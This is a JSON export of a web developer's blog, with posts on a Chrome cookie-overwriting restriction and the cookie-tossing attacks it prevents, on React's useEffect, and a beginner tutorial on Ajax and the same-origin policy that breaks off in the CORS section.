{"pages":[{"title":"About","text":"MeHey, I am Huli from Taiwan. I was a Front-end engineer before, and now a Security Engineer interested in web. I love coding, teaching and writing blog posts, and I believe sharing can make the world a better place. I also play CTF sometimes with Water Paddler. Three different versions of RSS feed are provided, you can find the link below: English only: https://blog.huli.tw/atom-en.xml Chinese only: https://blog.huli.tw/atom-ch.xml Both: https://blog.huli.tw/atom.xml TranslationMost of the articles are in Chinese, but starting from June 2023, I began using chatGPT to automatically translate articles from Chinese to English. You will see the words “translated by chatGPT” at the top of the articles. Please note that the automatic translation feature is still being adjusted, and most articles have not been manually reviewed.","link":"/en/about/index.html"}],"posts":[{"title":"The Most Difficult Cookie Problem I've Ever Encountered","text":"PrefaceA few weeks ago, I encountered some problems related to cookies at work. Before that, I thought to myself: “Cookies are just like that. Even if some attributes are not familiar, just search for information online. There are no difficult problems related to cookies, right?” However, the fact proved me wrong. I really encountered a cookie problem that took me a long time to solve. I believe that many people are eager to try it when they see this. So let me ask you first: Under what circumstances will cookies not be written? Obvious syntax errors don’t need to be mentioned. In addition to this, you may answer: writing cookies for a completely different domain. For example, your webpage is on http://a.com, but you insist on writing cookies for http://b.com. Of course, cookies cannot be written in this situation. Or, you may answer: adding the Secure flag to cookies that are not on https. Yes, cookies in this situation cannot be written either. Can you think of anything else? If you can’t think of anything, let me tell you! The Tragic BeginningA month ago, I wrote an article related to CSRF because I needed to implement CSRF defense at work, so I took the opportunity to study it. In short, you need to set a csrftoken in the cookie. But that day, I found that no matter how I wrote it, I couldn’t write it in. The URL of my test website is: http://test.huli.com, and the script for writing cookies is: document.cookie = \"csrftoken=11111111; expires=Wed, 29 Mar 2020 10:03:33 GMT; domain=.huli.com; path=/\" I just wanted to write a cookie named csrftoken for .huli.com. The problem I encountered was that no matter how I wrote it, I couldn’t write it in. There is absolutely no problem with this syntax. I have checked it several times, but I don’t know why it cannot be written in. We didn’t encounter any of the cases we mentioned at the beginning. This is just a simple http website, and it writes cookies for its own domain. Why can’t it be written in? At first, when I encountered this situation, I thought it might be a supernatural phenomenon on my computer. It would be fine on other people’s computers, so I didn’t care about it temporarily until one day, the PM said to me: “Hey, what’s wrong with this page?” After careful inspection, I found that it was because he couldn’t write this cookie either, which caused the server to fail to receive csrftoken and the verification failed. Okay, it seems that it is not a problem on my computer now, but everyone has this problem. However, there are other people who are normal. Everyone else can, but only two of us, me and the PM, can’t. Fortunately, I know that every time I encounter such strange problems, I should first open the incognito mode to see if your browser will be interfered with by other factors. After opening the incognito mode, I found that it worked. It can set cookies. It cannot be set under normal circumstances, but it can be set in incognito browsing mode. This is really strange. Why can’t it be set? Moreover, if I change the cookie to another name, such as csrftoken2, it can be written in! Only the name csrftoken cannot be written in. But cookies cannot have reserved words or anything like that! Even if there are, csrftoken is definitely not a reserved word. All of this is too strange. What is wrong with the name csrftoken? Why can’t it be written in? So I went to Google, using keywords such as cookie cannot be written, cookie can not set, unable set cookie, etc., but I found nothing. The answers I found were completely different from my situation. I looked at it with Chrome devtool, and there are no cookies on http://test.huli.com. How can’t it be written in? After a period of searching for information, I also went to check the rfc of cookies: HTTP State Management Mechanism, but still did not find relevant information. Finally, I don’t know where the inspiration came from. I went to the settings of Chrome to view all the cookies of huli.com, and after looking at them one by one, I deleted them. After deleting them, I could write cookies normally. Thinking about it carefully, it’s quite reasonable. After all, incognito mode works, which means that something done before will affect the writing of cookies. By deleting cookies, it can be confirmed that the problem must be on other related domains. It is speculated that other domains have done something that caused http://test.huli.com to be unable to write cookies. Later, I recalled the few cookies I had just deleted and found that there was another cookie with the same name, csrftoken. Clearing the CloudsRarely did I find a clue, so I had to follow it. I remembered that another website responsible for backend management was written at https://admin.huli.com. Because it uses django, the default cookie name after enabling CSRF protection is csrftoken. Looking carefully with Chrome devtool, this cookie was set to Secure and the domain was .admin.huli.com. There seemed to be nothing unusual. However, after visiting this website, I tried to go to http://test.huli.com again and found that I couldn’t write cookies, and even the original cookies disappeared mysteriously. Great! It seems that I am getting closer to the truth! After deleting this same-named cookie of .admin.huli.com, I visited my own http://test.huli.com and found that everything was normal. Cookies could be written normally. It seems that the answer is obvious, which is: As long as the same-named cookie of .admin.huli.com exists, http://test.huli.com cannot write the same-named cookie of .huli.com. The solution is actually very obvious at this point. The first is to change the cookie name, and the second is to change the domain. Regarding the second solution, do you remember that we wrote a cookie with the domain .huli.com on http://test.huli.com? As long as it is changed to write to the domain .test.huli.com, it can still work normally. So if we explain it in more detail, the problem of not being able to write cookies occurs when: When a cookie with a domain of .admin.huli.com and Secure flag is already set, http://test.huli.com cannot write the same-named cookie of .huli.com. After roughly confirming the problem, I began to adjust various variables to see if I could find out which link had a problem. Finally, I found two key points: Only Chrome cannot write, Safari and Firefox can. If the Secure flag is not set, it can be written. In-depth InvestigationSince there is such a powerful clue that only Chrome will have this situation, we can continue to investigate along this line. How to investigate? Yes, it is the simplest and most direct method: find the source code of Chromium! I have read many articles before that check the problem and finally find the source code. Finally, it’s my turn. But Chromium’s source code is so large, how should I start? So I decided to Google: chromium cookie and found very helpful information in the first search result: CookieMonster. This article explains in detail how Chromium’s cookie mechanism works and explains that the core is something called CookieMonster. Then you can go directly to see the source code, and you can find cookie_monster.cc in /net/cookies. Do you remember one of the key points discovered just now, which is related to the Secure flag? So I directly searched with Secure as the keyword and found a DeleteAnyEquivalentCookie function in the middle. The following is an excerpt from part of the source code, from line 1625 to line 1647: // If the cookie is being set from an insecure scheme, then if a cookie // already exists with the same name and it is Secure, then the cookie // should *not* be updated if they domain-match and ignoring the path // attribute. // // See: https://tools.ietf.org/html/draft-ietf-httpbis-cookie-alone if (cc->IsSecure() &amp;&amp; !source_url.SchemeIsCryptographic() &amp;&amp; ecc.IsEquivalentForSecureCookieMatching(*cc)) &#123; skipped_secure_cookie = true; histogram_cookie_delete_equivalent_->Add( COOKIE_DELETE_EQUIVALENT_SKIPPING_SECURE); // If the cookie is equivalent to the new cookie and wouldn't have been // skipped for being HTTP-only, record that it is a skipped secure cookie // that would have been deleted otherwise. if (ecc.IsEquivalent(*cc)) &#123; found_equivalent_cookie = true; if (!skip_httponly || !cc->IsHttpOnly()) &#123; histogram_cookie_delete_equivalent_->Add( COOKIE_DELETE_EQUIVALENT_WOULD_HAVE_DELETED); &#125; &#125; &#125; Here’s a helpful note that says: If a cookie comes from an insecure scheme and there is already a cookie with the same name that is set to Secure and domain-match, then this cookie should not be set. Although I don’t quite understand what domain-match means, it seems that the problem we encountered with not being able to write to the cookie occurred in this section. The reference material is also thoughtfully attached: https://tools.ietf.org/html/draft-ietf-httpbis-cookie-aloneThe title is “Deprecate modification of ‘secure’ cookies from non-secure origins.” The content is not long and can be quickly read. Here’s an excerpt from a small section: Section 8.5 and Section 8.6 of [RFC6265] spell out some of the drawbacks of cookies&#39; implementation: due to historical accident, non-secure origins can set cookies which will be delivered to secure origins in a manner indistinguishable from cookies set by that origin itself. This enables a number of attacks, which have been recently spelled out in some detail in [COOKIE-INTEGRITY]. The reference material is this: Cookies Lack Integrity: Real-World Implications, which includes a 20-minute video that you can watch to understand why writing to the cookie is not allowed. If you haven’t watched it yet, here’s a summary. To understand why the case at the beginning cannot write to the cookie, think about what would happen if it could be written to. If http://test.huli.com successfully writes the .huli.com csrftoken cookie, it doesn’t seem to have any impact on http://test.huli.com, it just adds another cookie, which seems reasonable. However, it has some impact on https://admin.huli.com. The original .admin.huli.com and Secure cookie will still be there, but now there is an additional .huli.com cookie with the same name. When https://admin.huli.com sends a request, both cookies will be sent together. So when the server receives it, it may look like this: csrftoken&#x3D;cookie_from_test_huli_com; csrftoken&#x3D;cookie_from_admin_huli_com But when encountering cookies with the same name, many people will only process the first one, so the csrftoken received by the server side will be cookie_from_test_huli_com. This means that even though you wrote a cookie in a Secure way on https://admin.huli.com, it was overwritten by another insecure source (http://test.huli.com)! What can be done with overwritten cookies? Here are a few examples given in the reference material (but I’m not sure if I understand them correctly, so please correct me if I’m wrong). The first is Gmail’s window, which is divided into two parts, one is the mailbox, and the other is Hangouts. Attackers can use the method mentioned above to overwrite the user’s cookie with their own session cookie. However, because Hangouts and Gmail have different domains, Gmail still uses the user’s account, but Hangouts has become the attacker’s account. The attacked person is likely to unknowingly use the attacker’s account to send messages, and the attacker can see those messages. The second example is a bank’s website. If the session cookie is replaced with the attacker’s when the user wants to add a credit card, then this credit card will be added to the attacker’s account! In short, all of these are methods of attacking by masking the original cookie and allowing the server side to use a new cookie. SummaryWhen I first encountered this problem, I was really troubled because I couldn’t figure out why a completely correct syntax command couldn’t be written into the cookie, and I rarely use the website https://admin.huli.com, so I didn’t think it was the problem. However, after solving the problem and looking back, there were some clues during the process. For example, it can be inferred from the fact that “clearing the cookie will solve the problem” that there is interference with other cookies, and it can also be inferred from the fact that it can be written into other browsers that there are some mechanisms in Chrome. Each clue in the process will lead you to a new path. As long as you persist, you will definitely be able to successfully navigate the maze.","link":"/2017/08/27/en/a-cookie-problem/"},{"title":"A Discussion on state and useEffect in React","text":"IntroductionRecently, I came across an article on the front-end community on Facebook: Understanding React useEffect 02, which discusses the usage of useEffect. There was also some discussion in the comments section. Initially, I found the usage in the article a bit strange, but I could somewhat understand why it was written that way. However, I still found it odd. I wanted to leave a comment, but then I thought, “Maybe I’m the one who’s mistaken,” so I decided to think about it some more. After careful consideration, I realized that I was the one who was mistaken. Therefore, in this post, I will share my thoughts. If there are any mistakes, please feel free to leave a comment below or discuss it with me in the front-end community. Before continuing to read, I recommend reading the original article and the discussion below it to better understand the context. Areas with Little ControversyFirstly, there is an area with little controversy that I want to point out, which is what the original post said in the community: useEffect is often set to be used with useCallback, useMemo, and other Hooks. Is it necessary to use them? I’m not sure where this assumption came from, but I personally have never heard of such a statement. useEffect does not necessarily have to be used with anything. To understand useEffect, you don’t need them. The purpose of useEffect is just like its name: “to handle side effects.” useEffect is useEffect, and it has no relation to useCallback or useMemo. Their purposes are completely different. However, I later thought that the reason why these Hooks might be confused with useEffect is probably related to the dependencies array of useEffect. But this is another issue, and these Hooks can be used separately. Other Parts to be Addressed in this ArticleLet’s summarize the questions raised by people below: It is rare to see api calls being made inside useEffect. Asynchronous requests are usually handled with redux middleware. The more common way to write this example is to call the search function on onClick. If you want to search while typing, you should do it on input onChange, not in the way described in the original article. The third point is actually what I want to emphasize in this post. I don’t think there is much of a problem with the first two points, and they can be answered together. Many asynchronous operations are handled with redux, but that doesn’t mean that asynchronous operations must always use redux. In some situations, redux is not necessary. In the example given by the original post, he just wants to write a simple search function. Why use redux? There are several reasons why you might need to use redux and its middleware: You need to access certain states from many different components, so it’s better to put them in a global place. Some asynchronous operation flows are more complicated, and using redux-saga or redux-observable can make the code more maintainable. However, this example is neither one nor the other, so there is no need to use redux. Furthermore, calling the API directly inside the component is not impossible, but it requires handling some issues, such as race conditions. For data retrieval like this, there are two related Hooks that many people use: react-query and swr, both of which call the API directly inside the component. However, “It is rare to see api calls being made inside useEffect” can also be interpreted as not directly calling the API inside useEffect, but wrapping it in another function: // first way of coding useEffect(() => &#123; fetch(...) &#125;) // second way of coding function fetchData() &#123; fetch(...) &#125; useEffect(() => &#123; fetchData() &#125;) This is just a discussion about the structure of the code, and I don’t think it’s that important in this example. However, this is related to the third point we will discuss later. Understanding through Practical ExamplesThe third point mentioned above, “The more common way to write this example is to call the search function on onClick. If you want to search while typing, you should do it on input onChange, not in the way described in the original article,” is actually the main point I want to discuss in this post. In order to make it easier for everyone to understand, let’s first explain the example. Understanding from the example will be faster. Here is a slightly different example, which I think will help you understand better. The example is as follows: there is an input on the screen, and when you type, it will call the hacker news API to search for related topics and display them on the screen, as shown in the figure: According to the above description, we can write the following code very intuitively: import React, &#123; useState &#125; from \"react\"; const baseUrl = \"https://hn.algolia.com/api/v1/search?query=\"; export default function App() &#123; const [data, setData] = useState(&#123; hits: [] &#125;); const [query, setQuery] = useState(\"\"); async function fetchData(keyword) &#123; const result = await fetch(baseUrl + keyword).then((res) => res.json()); setData(result); &#125; const handleChange = (e) => &#123; const value = e.target.value; setQuery(value); fetchData(value); &#125;; return ( &lt;> &lt;input value=&#123;query&#125; onChange=&#123;handleChange&#125; /> &lt;ul> &#123;data.hits.map((item) => ( &lt;li key=&#123;item.objectID&#125;> &lt;a href=&#123;item.url&#125;>&#123;item.title&#125;&lt;/a> &lt;/li> ))&#125; &lt;/ul> &lt;/> ); &#125; CodeSandbox link: https://codesandbox.io/s/react-hook-normal-v1-y0l9e Use a state called query to represent the value of the input, and then add a handleChange event to handle it. In addition to updating the state, use fetch to fetch the API data and then setData, and the data can be displayed on the screen. Okay, everything seems to be going smoothly, and there are no problems. (In actual situations, debounce is used to handle the request sending part, but this is not the focus, so it is not added.) But today, the PM suddenly added a new requirement: The default value of the input should be redux, and the data of this default value should be fetched when the page is loaded. If you have written class components before, you might think: It’s simple, just change the default value of query to redux, and then call fetchData in componentDidMount, right? So you changed the code to the following: import React, &#123; useState, useEffect &#125; from \"react\"; const baseUrl = \"https://hn.algolia.com/api/v1/search?query=\"; export default function App() &#123; const [data, setData] = useState(&#123; hits: [] &#125;); // You updated this const [query, setQuery] = useState(\"redux\"); async function fetchData(keyword) &#123; const result = await fetch(baseUrl + keyword).then((res) => res.json()); setData(result); &#125; // and this useEffect(() => &#123; fetchData(query); &#125;, []); const handleChange = (e) => &#123; const value = e.target.value; setQuery(value); fetchData(value); &#125;; return ( &lt;> &lt;input value=&#123;query&#125; onChange=&#123;handleChange&#125; /> &lt;ul> &#123;data.hits.map((item) => ( &lt;li key=&#123;item.objectID&#125;> &lt;a href=&#123;item.url&#125;>&#123;item.title&#125;&lt;/a> &lt;/li> ))&#125; &lt;/ul> &lt;/> ); &#125; However, at this time, the code gatekeeper ESLint raised a familiar warning: React Hook useEffect has a missing dependency: ‘query’. Either include it or remove the dependency array. (react-hooks&#x2F;exhaustive-deps) This is because React thinks that you are using the query dependency in useEffect. To prevent you from getting the old value and causing bugs in the program, it reminds you to remember to add dependencies. However, in our example, our requirement is indeed to call fetchData only when the page is first rendered, so this behavior is correct, so you can temporarily ignore it. When you go to find the PM after changing the code, he looks at you a little embarrassed and says, “Sorry, there is a new requirement again. The boss has bought a lot of Tesla’s stocks recently, so please add a button called tesla. After clicking the button, the content of the input will be changed to tesla, and this keyword will be searched.” To meet the boss’s requirements, you immediately made another version for him: import React, &#123; useState, useEffect &#125; from \"react\"; const baseUrl = \"https://hn.algolia.com/api/v1/search?query=\"; export default function App() &#123; const [data, setData] = useState(&#123; hits: [] &#125;); const [query, setQuery] = useState(\"redux\"); async function fetchData(keyword) &#123; const result = await fetch(baseUrl + keyword).then((res) => res.json()); setData(result); &#125; useEffect(() => &#123; fetchData(query); &#125;, []); const handleChange = (e) => &#123; const value = e.target.value; setQuery(value); fetchData(value); &#125;; // You added this const handleClick = () => &#123; setQuery(\"tesla\"); fetchData(\"tesla\"); &#125;; return ( &lt;> &lt;input value=&#123;query&#125; onChange=&#123;handleChange&#125; /> &lt;button onClick=&#123;handleClick&#125;>tesla&lt;/button> &lt;ul> &#123;data.hits.map((item) => ( &lt;li key=&#123;item.objectID&#125;> &lt;a href=&#123;item.url&#125;>&#123;item.title&#125;&lt;/a> &lt;/li> ))&#125; &lt;/ul> &lt;/> ); &#125; Example code: https://codesandbox.io/s/react-hook-normal-v2-zh7t7?file=/src/App.js Okay, the code is almost done, let’s get to the point. In the above example, for example, the following code: const handleChange = (e) => &#123; const value = e.target.value; setQuery(value); fetchData(value); &#125;; When we write code, we think like this: “When the user changes the input, I should update the state and call the API at the same time.” const handleClick = () => &#123; setQuery(\"tesla\"); fetchData(\"tesla\"); &#125;; When the user clicks the Tesla button, I should update the state and then call the API again to get the latest data. The point we are thinking about is: “What should I do after I have done something?” For example, when the user enters text, a new list should be fetched; when the user clicks a button, Tesla’s data should be fetched. Next, let me demonstrate another way of writing: import React, &#123; useState, useEffect &#125; from \"react\"; const baseUrl = \"https://hn.algolia.com/api/v1/search?query=\"; export default function App() &#123; const [data, setData] = useState(&#123; hits: [] &#125;); const [query, setQuery] = useState(\"redux\"); async function fetchData(keyword) &#123; const result = await fetch(baseUrl + keyword).then((res) => res.json()); setData(result); &#125; // only the code below changed useEffect(() => &#123; fetchData(query); &#125;, [query]); const handleChange = (e) => &#123; setQuery(e.target.value); &#125;; const handleClick = () => &#123; setQuery(\"tesla\"); &#125;; return ( &lt;> &lt;input value=&#123;query&#125; onChange=&#123;handleChange&#125; /> &lt;button onClick=&#123;handleClick&#125;>tesla&lt;/button> &lt;ul> &#123;data.hits.map((item) => ( &lt;li key=&#123;item.objectID&#125;> &lt;a href=&#123;item.url&#125;>&#123;item.title&#125;&lt;/a> &lt;/li> ))&#125; &lt;/ul> &lt;/> ); &#125; The biggest difference between this writing and our previous one is that the way of thinking is completely different. The point we originally thought about was “What should I do after I have done something?” After changing to this way, the point of thinking becomes: “What should I do when the state changes?” This is a very reactive way of writing, responding to a certain change. I first established one thing, that is, “when the state changes, I need to call the API.” Therefore, when the user enters text, the only thing I need to do is to change the state; when the user clicks the button, I only need to change the state to Tesla. I think in this context, it can best explain the meaning of useEffect: useEffect(() => &#123; fetchData(query); &#125;, [query]); When the query changes, I want to execute a side effect (fetchData). This is the meaning of useEffect: when the dependencies change, I want to execute some side effects. Then, the fetchData in our code is only used by that useEffect, so we can move it inside, like this: useEffect(() => &#123; async function fetchData() &#123; const result = await fetch(baseUrl + query).then((res) => res.json()); setData(result); &#125; fetchData(); &#125;, [query]); After the change, it looks very similar to the example given in the original post. If you want a technical term, I would say that the approach we demonstrated at the beginning is called imperative, while the current one is called reactive (but I’m not very familiar with technical terms, so please correct me if I’m wrong). Do you remember the core concept of React? UI is just a way of presenting state, UI = F(state). Therefore, when the screen changes, we don’t need to worry about how it changes, we just need to change the state. I think the reactive approach above is very similar. We just need to change the state and specify which actions (side effects) should be executed when the state changes, without explicitly writing what should be done for each action. Back to the original exampleIn the original example, the code is written like this: import React, &#123; useState, useEffect &#125; from \"react\" import axios from \"axios\" import \"./styles.css\" const baseUrl = \"https://hn.algolia.com/api/v1/search?query=\" export default function App() &#123; const [data, setData] = useState(&#123; hits: [] &#125;) const [query, setQuery] = useState(\"redux\") const [url, setUrl] = useState(baseUrl+query) useEffect(() => &#123; async function fetchData() &#123; const result = await axios(url) setData(result.data) &#125; console.log(\"hi\") fetchData() &#125;, [url]) return ( &lt;> &lt;input value=&#123;query&#125; onChange=&#123; event=>setQuery(event.target.value) &#125; /> &lt;button onClick=&#123; ()=>setUrl(baseUrl+query) &#125;>Search&lt;/button> &lt;ul> &#123;data.hits.map((item) => ( &lt;li key=&#123;item.objectID&#125;> &lt;a href=&#123;item.url&#125;>&#123;item.title&#125;&lt;/a> &lt;/li> ))&#125; &lt;/ul> &lt;/> ) &#125; The most confusing part for most people is probably what most people would do when they press the search button: fetchData(baseUrl + query) But in the code, it is only: setUrl(baseUrl+query) And then useEffect is used to call fetchData. The above example is actually the second approach I mentioned earlier. The point of thinking is: “Whenever the url state changes, I will call the API to get data”, rather than “When the user clicks the button, I will call the API”. These are two completely different ways of thinking. When writing code, most people probably still use the first approach, which is to change the state and do something else after the operation. Few people have the concept of the second approach, but I think the second approach is actually one of the essences of React. However, the actual usage depends on the context, and there is no saying which one is better. For example, in the example where I have to send an API while typing, if you notice, you will find that every time the state changes, we need to write another fetchData to get the data. In this case, I think the second approach is more suitable. Finally, there is something in the official React documentation that has an example like this (the original example did not add dependencies, but it was added in other paragraphs): import React, &#123; useState, useEffect &#125; from 'react'; function Example() &#123; const [count, setCount] = useState(0); useEffect(() => &#123; document.title = `You clicked $&#123;count&#125; times`; &#125;, [count]); return ( &lt;div> &lt;p>You clicked &#123;count&#125; times&lt;/p> &lt;button onClick=&#123;() => setCount(count + 1)&#125;> Click me &lt;/button> &lt;/div> ); &#125; This is also a reactive approach, which is what I have been emphasizing: “What side effect should be executed when the state changes.” If you want to change it to another approach, it will look like this: import React, &#123; useState, useEffect &#125; from 'react'; function Example() &#123; const [count, setCount] = useState(0); return ( &lt;div> &lt;p>You clicked &#123;count&#125; times&lt;/p> &lt;button onClick=&#123;() => &#123; document.title = `You clicked $&#123;count + 1&#125; times`; setCount(count + 1) &#125;&#125;> Click me &lt;/button> &lt;/div> ); &#125; SummaryActually, the main point I want to discuss in this article is not Redux, nor where to call the API, these are secondary. The focus is on understanding the useEffect hook. My understanding of it is: “Write what side effect to execute after the dependencies change.” From this point, there will be the reactive approach I mentioned above: “What should I do after the state changes.” Finally, regarding these hooks, I highly recommend Dan’s two articles, which are really great: How Are Function Components Different from Classes? A Complete Guide to useEffect This article records my understanding of useEffect. If you have any questions, you can discuss them with me. Postscript (added on 2020-09-10)After the article was published, someone in the community reminded me that what I was talking about was just one part of useEffect. useEffect is not that complicated. It’s just a “side effect that will be executed after the function component is rendered”, that’s it. It doesn’t even have anything to do with state. Later, I thought about it and felt that this was indeed the correct understanding of useEffect. As for what was mentioned in this article, it can be said to be one of the ways to use useEffect. Because the second parameter of useEffect can specify “when there are changes in which dependencies, I want to execute this side effect”, and you can put state in the dependencies, then it becomes what this article says: “What I want to do when the state changes”. So what this article mentions is just one way to use useEffect, and it doesn’t see the full picture of useEffect. useEffect is just a “side effect that will be executed after the function component is rendered”. And the usage mentioned in the article is just to add dependencies to useEffect, becoming “a side effect that will be executed after the function component is rendered, if the state has changed”. In addition, the phrase “if the state has changed” is not so accurate, because useEffect will also be executed during didMount, but at that time the state has not changed, it is still the initial value. So a more precise statement may be: “After the function component is rendered, if it is didMount or the state has changed, the side effect will be executed”. Thanks to Chen Guanlin for the correction.","link":"/2020/09/09/en/about-react-state-and-hooks-use-effect/"},{"title":"Understanding Ajax and Cross-Origin Requests Easily","text":"IntroductionWhen learning to write web pages, you usually start with HTML and CSS, which are responsible for creating and beautifying the layout. Once you have a solid foundation, you start learning JavaScript to create interactive effects. In addition to user and browser interactions, don’t forget about the interaction between the client and server, which means you must learn how to use JavaScript to retrieve data from the backend server. Otherwise, your web page data will be static. The main target audience of this article is beginners in web front-end development. I hope that after reading this article, readers who do not understand how to exchange data with the server or how to connect to APIs can have a better understanding of how to connect to the backend. Let’s start with an exampleBefore we begin, let’s consider a question: Why does the front-end need to exchange data with the backend? Actually, this depends on the type of web page you are creating. If you are creating an official website, the entire website is likely to be static, and only HTML and CSS are required, without the need to retrieve data from the backend server. Let’s assume that today we want to create a web page that can browse the current Twitch live stream list, as shown below. If this web page does not retrieve data from the backend, it means that the content of the web page is fixed and will remain the same no matter when it is viewed. However, this is not correct because the goal of this web page is to display “channels that are currently live,” so the content will change accordingly. Since the content will change, we must continuously update the data, retrieve data from the server, and then display it after processing it on the front-end. After confirming the need to retrieve data, we can ask ourselves two questions: Who do we retrieve data from? How do we retrieve data? The answer to the first question is obviously Twitch because Twitch has the data we need! As for the second question, we must use the Twitch API. APIWhat is an API? You may have heard this term many times, but still don’t know what it means. Let’s start with its full name, which is “Application Programming Interface.” You may wonder what this is and why I can’t understand it in both Chinese and English. But actually, the most important thing in these few words is the word “interface.” What is an interface? An interface is used for connection. I’ll give you an example. Isn’t there a USB slot on your computer? As long as you see USB flash drives on the market, you can buy them and plug them into the USB slot, and your computer can read them. Have you ever wondered why? Although they are made by different manufacturers, they can all be read and plugged into the USB slot. This is because there is a standard called the USB interface. After this standard was established, as long as all manufacturers develop according to this standard, they can ensure that they can connect to the computer and USB flash drives. API is the same, but it becomes a connection between programs. For example, if I need to read a file in my program, how do I read it? Reading files is a function provided by the operating system, so I can connect to the “read file API” and use this function in my program. I’ll give you a few more examples. Suppose I want to allow my web page to log in with Facebook. What should I do? I need to connect to the “Facebook API,” which is a set of standards provided by Facebook to everyone who wants to access Facebook services. Any developer who wants to access Facebook services can follow these standards to obtain the data they want. This thing is called an API. Or maybe you are a developer of a hotel management system today, and your company has developed an ERP for hotels, which can manage the booking status of hotels and so on, and can know which rooms are empty now. If you only use this data yourself, it would be a pity. Therefore, the company decided to provide this data to large booking websites, which can display the room status of this hotel in real-time on those websites. Therefore, data exchange is necessary, and you need to provide a “query room status API” to other websites so that they can connect to it and obtain this information. By now, you should have some sense of what an API is. Let me give you a few more examples: I want to retrieve photos from Flickr, so I need to connect to the Flickr API. Google wants to allow other apps to log in and authenticate with Google, so Google needs to provide the “Google login API.” I want to retrieve the channels currently available on Twitch, so I need to connect to the Twitch API. API DocumentationNow that we know what an API is and that we need to connect to it, the next question is “how do we connect?” Earlier, we mentioned an example of file access. This is actually more like calling a function provided by the operating system or a programming language library. You can usually find more detailed information about these functions in the official documentation, such as reading files in Node.js: (Source: https://nodejs.org/api/fs.html#fs_fs_readdir_path_options_callback) Above, it is written which function you should call and what parameters you should pass in. API integration is the same. You must have documentation to know how to integrate, otherwise you cannot integrate at all because you don’t even know what parameters to pass. Let’s take a look at how the Twitch API documentation is written. It explains that you must have a Client ID, and the API Root URL is https://api.twitch.tv/kraken, etc. These are basic information related to the API. If you click on any API in the left column, you will see detailed information about each API: Here, it is written what the URL is, what parameters you should pass, etc. There are also reference examples below, which is a very complete API documentation. Usually, when writing web pages, we directly talk about APIs, but actually we are referring to Web APIs, which are APIs transmitted through the network. Are there non-Web APIs? Yes, like the file reading API we mentioned earlier, they are all executed locally on the computer without going through any network. But this doesn’t really matter, everyone is used to talking about APIs, as long as they can understand it. Now that we have the API documentation, we have all the information we need. Using the Twitch example above, as long as we can send a request to https://api.twitch.tv/kraken/games/top?client_id=xxx through JavaScript, Twitch will return the current list of the most popular games. We have narrowed down the scope of the problem step by step. At first, it was “how to get data from Twitch”, and now it is divided into: “how to use JavaScript to send a request”. AjaxTo send a request on the browser, you must use a technology called Ajax, which stands for “Asynchronous JavaScript and XML”, with the emphasis on the word “Asynchronous”. Before talking about what is asynchronous, let’s first mention what is synchronous. Almost all JavaScript you originally wrote is executed synchronously. This means that when it executes to a certain line, it will wait for this line to finish executing before executing the next line, ensuring the execution order. That is to say, the last line of the following code needs to wait for a long time to be executed: var count = 10000000; while(count--) &#123; // Do some time-consuming operations &#125; // Executed after a long time console.log('done') It looks reasonable. Isn’t the program executed line by line? But if it involves network operations, everyone can think about the following example: // Assuming there is a function called sendRequest to send a request var result = sendRequest('https://api.twitch.tv/kraken/games/top?client_id=xxx'); // Executed after a long time console.log(result); When JavaScript executes sendRequest, because it is synchronous, it will wait for the response to come back before continuing to do anything. In other words, before the response comes back, the entire JavaScript engine will not execute anything! It’s scary, isn’t it? You click on anything related to JavaScript, and there is no response because JavaScript is still waiting for the response. Therefore, for operations that are expected to be very time-consuming and unstable, synchronous execution cannot be used, but asynchronous execution must be used. What does asynchronous mean? It means that after it is executed, it will not be taken care of, and it will continue to execute the next line without waiting for the result to come back: // Assuming there is a function called sendRequest to send a request var result = sendRequest('https://api.twitch.tv/kraken/games/top?client_id=xxx'); // The above request is executed, and then it executes to this line, so result will not have anything // because the response has not returned yet console.log(result); Please note that “asynchronous functions cannot directly return results through return”. Why? Because, as in the example above, after sending a request, the next line will be executed, and at this time, there is no response yet. What should be returned? So what should we do? Let me give you a very common example! When I was eating in a food court in Singapore, there was a table number on each table. When you order, just tell the boss which table you are sitting at, and the boss will deliver it to you after the meal is ready. So I don’t need to stand at the door of the store and wait. I just continue to sit on my own things. Anyway, the boss will deliver it to me after the meal is ready. The concept of asynchronous is also like this. After I send a request (after I order), I don’t need to wait for the response to come back (I don’t need to wait for the boss to finish), I can continue to do my own thing. After the response comes back (after the meal is ready), it will help me deliver the result (the boss will deliver it by himself). In the ordering example, the boss can know where to send the data through the table number. What about in JavaScript? Through Function! And this function, we call it a Callback Function, a callback function. When the asynchronous operation is completed, this function can be called and the data can be brought in. // Assuming there is a function called sendRequest to send a request sendRequest('https://api.twitch.tv/kraken/games/top?client_id=xxx', callMe); function callMe (response) &#123; console.log(response); &#125; // Or write it as an anonymous function sendRequest('https://api.twitch.tv/kraken/games/top?client_id=xxx', function (response) &#123; console.log(response); &#125;); Now you know why network operations are asynchronous and what callback functions are. XMLHttpRequestJust mentioned the concepts of Ajax, asynchronous, and callback functions, but didn’t say how to send a request, just wrote a fake sendRequest function as a reference. To send a request, we need to use an object prepared by the browser called XMLHttpRequest. The sample code is as follows: var request = new XMLHttpRequest(); request.open('GET', `https://api.twitch.tv/kraken/games/top?client_id=xxx`, true); request.onload = function() &#123; if (request.status >= 200 &amp;&amp; request.status &lt; 400) &#123; // Success! console.log(request.responseText); &#125; &#125;; request.send(); The request.onload above actually specifies which function to use to handle the data when it comes back. With the above code, you have finally succeeded and can finally connect to the Twitch API and get data from there! It’s really gratifying. From now on, you will live a happy life with the skill of “connecting to the API”… Not really. Same Origin PolicyJust when you thought you were already familiar with connecting to APIs and wanted to try connecting to other APIs, you found that a problem occurred with just one line: XMLHttpRequest cannot load http:&#x2F;&#x2F;odata.tn.edu.tw&#x2F;ebookapi&#x2F;api&#x2F;getOdataJH&#x2F;?level&#x3D;all. No &#39;Access-Control-Allow-Origin&#39; header is present on the requested resource. Origin &#39;null&#39; is therefore not allowed access. Huh? Why is there this error? In fact, for security reasons, the browser has something called the Same-origin policy. This means that if the website you are currently on and the API website you want to call are “different sources”, the browser will still help you send the request, but it will block the response, preventing your JavaScript from receiving it and returning an error. What is a different source? Simply put, if the domain is different, it is a different source, or if one uses http and the other uses https, or if the port numbers are different, it is also a different source. So if you are using someone else’s API, in most cases it will be a different source. I want to emphasize here that “your request is still sent”, and the browser “does receive the response”, but the key point is that “due to the same-origin policy, the browser does not pass the result back to your JavaScript”. If there is no browser, there is actually no such problem. You can send it to whoever you want and get the response no matter what. Okay, since we just said that different sources will be blocked, how did we successfully connect to the Twitch API? CORSAs we all know, it is very common to transfer data between different sources, just like we connect to the Twitch API. How can we be under the same domain as the Twitch API? Therefore, the same-origin policy does regulate that non-same-origin requests will be blocked, but at the same time, there is another regulation that 